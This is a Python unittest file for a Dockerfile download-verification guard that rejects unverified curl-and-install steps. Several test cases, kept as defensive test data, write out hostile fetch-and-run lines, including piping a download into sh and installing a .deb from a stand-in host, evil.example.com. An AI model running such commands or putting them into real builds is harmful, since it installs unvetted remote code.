#!/usr/bin/env python3
"""Tests for the Dockerfile.tools download-verification gate.\n\ncheck-download-verification.py is what keeps a new `curl | dpkg -i` from\nbeing added next to the verified downloads, so its negative cases - an\nunverified fetch, a mutable 'latest' path, verification deferred to a later\nlayer - are the point of this file."""

from __future__ import annotations

import importlib.util
import tempfile
import unittest
from pathlib import Path

SCRIPTS = Path(__file__).resolve().parent


def load(filename: str, module_name: str):
    spec = importlib.util.spec_from_file_location(module_name, SCRIPTS / filename)
    if spec is None or spec.loader is None:
        raise RuntimeError(f"could not load {filename}")
    module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(module)
    return module


guard = load("check-download-verification.py", "check_download_verification")

VERIFIED_RUN = """RUN curl --fail --location --silent https://example.com/v1.2.3/tool.tar.gz --output tool.tar.gz \\
    && python3 /opt/hoop/build-integrity/verify-manual-download.py \\
      /opt/hoop/build-integrity/agent-tools-checksums.sha256 tool.tar.gz \\
    && tar -xf tool.tar.gz
"""


class DownloadGuardTests(unittest.TestCase):
    def check(self, contents: str) -> list[str]:
        with tempfile.TemporaryDirectory() as directory:
            dockerfile = Path(directory) / "Dockerfile.probe"
            dockerfile.write_text(contents)
            return guard.check(dockerfile)

    def test_verified_download_passes(self):
        self.assertEqual(self.check(VERIFIED_RUN), [])

    def test_download_without_verification_is_rejected(self):
        problems = self.check(
            "RUN curl -sL https://example.com/v1/tool.deb -o tool.deb && dpkg -i tool.deb\n"
        )
        self.assertEqual(len(problems), 1)
        self.assertIn("never calls verify-manual-download.py", problems[0])

    def test_mutable_latest_path_is_rejected(self):
        problems = self.check(
            "RUN curl -sL https://example.com/plugin/latest/tool.deb -o tool.deb \\\n"
            "    && python3 /opt/hoop/build-integrity/verify-manual-download.py m tool.deb\n"
        )
        self.assertEqual(len(problems), 1)
        self.assertIn("mutable path", problems[0])

    def test_verification_in_a_later_run_does_not_count(self):
        """A separate RUN is a separate layer: the install already happened."""
        problems = self.check(
            "RUN curl -sL https://example.com/v1/tool.deb -o tool.deb && dpkg -i tool.deb\n"
            "RUN python3 /opt/hoop/build-integrity/verify-manual-download.py m tool.deb\n"
        )
        self.assertEqual(len(problems), 1)

    def test_curl_as_a_package_name_is_not_a_download(self):
        self.assertEqual(self.check("RUN apt install -y curl wget gnupg\n"), [])

    def test_url_inside_a_comment_is_not_a_download(self):
        self.assertEqual(
            self.check("RUN echo ok \\\n    # see https://example.com/latest/docs\n"),
            [],
        )

    def test_multiline_run_is_evaluated_as_one_instruction(self):
        """The verifier on a continuation line still counts as same-instruction."""
        self.assertEqual(guard.check.__module__, guard.__name__)
        self.assertEqual(self.check(VERIFIED_RUN), [])

    def test_variable_url_is_still_a_download(self):
        problems = self.check('RUN curl -sL "$TOOL_URL" -o t.deb && dpkg -i t.deb\n')
        self.assertTrue(problems)

    def test_add_from_a_url_is_rejected(self):
        problems = self.check("ADD https://example.com/v1/t.tar.gz /tmp/t.tar.gz\n")
        self.assertEqual(len(problems), 1)
        self.assertIn("ADD <url>", problems[0])

    def test_piping_a_download_into_a_shell_is_rejected(self):
        problems = self.check("RUN curl -sL https://example.com/v1/i.sh | sh\n")
        self.assertTrue(any("interpreter" in problem for problem in problems))

    def test_exemption_does_not_cover_other_downloads_in_the_same_run(self):
        problems = self.check(
            "RUN curl --fail --silent https://www.mongodb.org/static/pgp/server-8.0.asc -o k.asc \\\n"
            '    && echo "$MONGODB_KEY_FPR" \\\n'
            "    && curl -sL https://evil.example.com/v1/x.deb -o x.deb && dpkg -i x.deb\n"
        )
        self.assertTrue(problems)

    def test_exemption_requires_its_alternative_check(self):
        """Fetching the key without asserting its fingerprint is not exempt."""
        problems = self.check(
            "RUN curl --fail --silent https://www.mongodb.org/static/pgp/server-8.0.asc "
            "-o k.asc && apt-key add k.asc\n"
        )
        self.assertTrue(problems)

    def test_exempt_key_download_with_its_fingerprint_check_passes(self):
        self.assertEqual(
            self.check(
                "RUN curl --fail --silent https://www.mongodb.org/static/pgp/server-8.0.asc "
                '-o k.asc && test "$fpr" = "$MONGODB_KEY_FPR"\n'
            ),
            [],
        )

    def test_real_dockerfile_has_no_unverified_downloads(self):
        dockerfile = SCRIPTS.parent.parent / "Dockerfile.tools"
        self.assertEqual(guard.check(dockerfile), [])


if __name__ == "__main__":
    unittest.main()
